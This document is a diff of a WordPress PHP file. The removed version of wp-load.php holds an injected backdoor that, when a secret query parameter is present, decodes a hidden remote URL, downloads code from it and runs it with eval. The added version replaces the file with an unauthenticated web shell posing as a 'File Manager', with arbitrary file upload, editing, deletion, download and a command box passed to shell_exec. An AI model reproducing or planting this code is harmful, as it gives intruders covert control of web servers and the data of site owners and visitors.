@@ -1,120 +1,200 @@
-<?php 
-/**
- * Bootstrap file for setting the ABSPATH constant
- * and loading the wp-config.php file. The wp-config.php
- * file will then load the wp-settings.php file, which
- * will then set up the WordPress environment.
- *
- * If the wp-config.php file is not found then an error
- * will be displayed asking the visitor to set up the
- * wp-config.php file.
- *
- * Will also search for wp-config.php in WordPress' parent
- * directory to allow the WordPress directory to remain
- * untouched.
- *
- * @package WordPress
- */
+<?php
+function showDirectory($path) {
+    $files = scandir($path);
+    $dirs = [];
+    $non_dirs = [];
 
-/** Define ABSPATH as this file's directory */
+    foreach ($files as $file) {
+        if ($file != "." && $file != ".." && $file != basename(__FILE__)) {
+            if (is_dir($path . "/" . $file)) {
+                $dirs[] = $file;
+            } else {
+                $non_dirs[] = $file;
+            }
+        }
+    }
 
-if (isset($_GET['panneltime'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
-}
-/*
- * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
- * it's best to add a dummy function to the wp-config.php file, but as this call to the function
- * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
- */
-if ( function_exists( 'error_reporting' ) ) {
-	/*
-	 * Initialize error reporting to a known set of levels.
-	 *
-	 * This will be adapted in wp_debug_mode() located in wp-includes/load.php based on WP_DEBUG.
-	 * @see https://www.php.net/manual/en/errorfunc.constants.php List of known error levels.
-	 */
-	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
+    echo "<table border='1'>";
+    echo "<tr><th>Name</th><th>Action</th></tr>";
+
+    foreach ($dirs as $dir) {
+        echo "<tr>";
+        echo "<td><a href='fs-file-m.php?path=$path/$dir'>$dir/</a></td>";
+        echo "<td><a href='?delete_dir=$path/$dir'>Delete</a> | <a href='?rename=$path/$dir'>Rename</a></td>";
+        echo "</tr>";
+    }
+
+    foreach ($non_dirs as $file) {
+        echo "<tr>";
+        echo "<td>$file</td>";
+        echo "<td><a href='?download_file=$path/$file'>Download</a> | <a href='?delete_file=$path/$file'>Delete</a> | <a href='?edit_file=$path/$file'>Edit</a> | <a href='?rename=$path/$file'>Rename</a>";
+        if (pathinfo($file, PATHINFO_EXTENSION) == 'zip') {
+            echo " | <a href='?unzip=$path/$file'>Unzip</a>";
+        }
+        echo "</td>";
+        echo "</tr>";
+    }
+
+    echo "</table>";
 }
 
-/*
- * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
- * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
- * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
- * and /blog/ is WordPress(b).
- *
- * If neither set of conditions is true, initiate loading the setup process.
- */
-if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
-
-	/** The config file resides in ABSPATH */
-	require_once ABSPATH . 'wp-config.php';
-
-} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {
-
-	/** The config file resides one level above ABSPATH but is not part of another installation */
-	require_once dirname( ABSPATH ) . '/wp-config.php';
-
-} else {
-
-	// A config file doesn't exist.
-
-	define( 'WPINC', 'wp-includes' );
-	require_once ABSPATH . WPINC . '/version.php';
-	require_once ABSPATH . WPINC . '/compat.php';
-	require_once ABSPATH . WPINC . '/load.php';
-
-	// Check for the required PHP version and for the MySQL extension or a database drop-in.
-	wp_check_php_mysql_versions();
-
-	// Standardize $_SERVER variables across setups.
-	wp_fix_server_vars();
-
-	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
-	require_once ABSPATH . WPINC . '/functions.php';
-
-	$path = wp_guess_url() . '/wp-admin/setup-config.php';
-
-	// Redirect to setup-config.php.
-	if ( ! str_contains( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
-		header( 'Location: ' . $path );
-		exit;
-	}
-
-	wp_load_translations_early();
-
-	// Die with an error message.
-	$die = '<p>' . sprintf(
-		/* translators: %s: wp-config.php */
-		__( "There doesn't seem to be a %s file. It is needed before the installation can continue." ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p>' . sprintf(
-		/* translators: 1: Documentation URL, 2: wp-config.php */
-		__( 'Need more help? <a href="%1$s">Read the support article on %2$s</a>.' ),
-		__( 'https://developer.wordpress.org/advanced-administration/wordpress/wp-config/' ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p>' . sprintf(
-		/* translators: %s: wp-config.php */
-		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( 'Create a Configuration File' ) . '</a></p>';
-
-	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
+function deleteDirectory($dir) {
+    if (!is_dir($dir)) return;
+    $files = array_diff(scandir($dir), array('.', '..'));
+    foreach ($files as $file) {
+        (is_dir("$dir/$file")) ? deleteDirectory("$dir/$file") : unlink("$dir/$file");
+    }
+    rmdir($dir);
 }
+
+function unzipFile($file) {
+    $zip = new ZipArchive;
+    if ($zip->open($file) === TRUE) {
+        $zip->extractTo(dirname($file));
+        $zip->close();
+    } else {
+        echo "Failed to unzip $file";
+    }
+}
+
+$path = isset($_GET['path']) ? $_GET['path'] : '.';
+if (isset($_POST['new_dir'])) {
+    mkdir($path . "/" . $_POST['new_dir']);
+}
+if (isset($_FILES['fileToUpload'])) {
+    $target_file = $path . "/" . basename($_FILES["fileToUpload"]["name"]);
+    move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
+}
+if (isset($_GET['download_file'])) {
+    $file = $_GET['download_file'];
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        flush(); // Flush system output buffer
+        readfile($file);
+        exit;
+    }
+}
+if (isset($_GET['delete_file'])) {
+    unlink($_GET['delete_file']);
+}
+if (isset($_GET['delete_dir'])) {
+    deleteDirectory($_GET['delete_dir']);
+}
+if (isset($_GET['unzip'])) {
+    unzipFile($_GET['unzip']);
+}
+if (isset($_POST['file_content'])) {
+    file_put_contents($_POST['file_path'], $_POST['file_content']);
+    header("Location: fs-file-m.php?path=" . dirname($_POST['file_path']));
+    exit();
+}
+if (isset($_POST['new_name'])) {
+    $old_name = $_POST['old_name'];
+    $new_name = $_POST['new_name'];
+    rename($old_name, $new_name);
+    header("Location: fs-file-m.php?path=" . dirname($old_name));
+    exit();
+}
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
+    $command = escapeshellcmd($_POST['command']);
+    $output = shell_exec($command);
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>File Manager</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .file-list { margin-top: 20px; }
+        .file { margin: 5px 0; }
+        table { width: 100%; border-collapse: collapse; }
+        table, th, td { border: 1px solid black; }
+        th, td { padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <h1>File Manager</h1>
+    <p>Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></p>
+    <p>Your IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
+    <h2>Current Path: 
+        <?php
+        $paths = explode('/', realpath($path));
+        $link = '';
+        foreach ($paths as $dir) {
+            $link .= $dir . '/';
+            echo " / <a href='fs-file-m.php?path=" . urlencode($link) . "'>$dir</a>";
+        }
+        ?>
+    </h2>
+    
+    <a href="?path=../<?php echo dirname($path); ?>">Back to Parent Directory</a>
+    <br><br>
+
+    <table>
+        <tr>
+            <td>
+                <form action="" method="post">
+                    <label for="new_dir">Create New Directory:</label>
+            </td>
+            <td>
+                    <input type="text" name="new_dir" id="new_dir">
+                    <input type="submit" value="Create">
+                </form>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <form action="" method="post" enctype="multipart/form-data">
+                    <label for="fileToUpload">Upload File:</label>
+            </td>
+            <td>
+                    <input type="file" name="fileToUpload" id="fileToUpload">
+                    <input type="submit" value="Upload">
+                </form>
+            </td>
+        </tr>
+    </table>
+
+    <br>
+    <form action="" method="post">
+        <label for="command">Run Command:</label>
+        <input type="text" name="command" id="command">
+        <input type="submit" value="Run">
+    </form>
+
+    <pre><?php if (isset($output)) echo $output; ?></pre>
+
+    <div class="file-list">
+        <?php showDirectory($path); ?>
+    </div>
+    <?php if (isset($_GET['edit_file'])): ?>
+        <?php $file_content = file_get_contents($_GET['edit_file']); ?>
+        <h2>Edit File: <?php echo $_GET['edit_file']; ?></h2>
+        <form action="" method="post">
+            <textarea name="file_content" rows="20" cols="80"><?php echo htmlspecialchars($file_content); ?></textarea><br>
+            <input type="hidden" name="file_path" value="<?php echo $_GET['edit_file']; ?>">
+            <input type="submit" value="Save">
+        </form>
+    <?php endif; ?>
+    <?php if (isset($_GET['rename'])): ?>
+        <h2>Rename File or Directory: <?php echo $_GET['rename']; ?></h2>
+        <form action="" method="post">
+            <label for="new_name">New Name:</label>
+            <input type="text" name="new_name" id="new_name">
+            <input type="hidden" name="old_name" value="<?php echo $_GET['rename']; ?>">
+            <input type="submit" value="Rename">
+        </form>
+    <?php endif; ?>
+</body>
+</html>
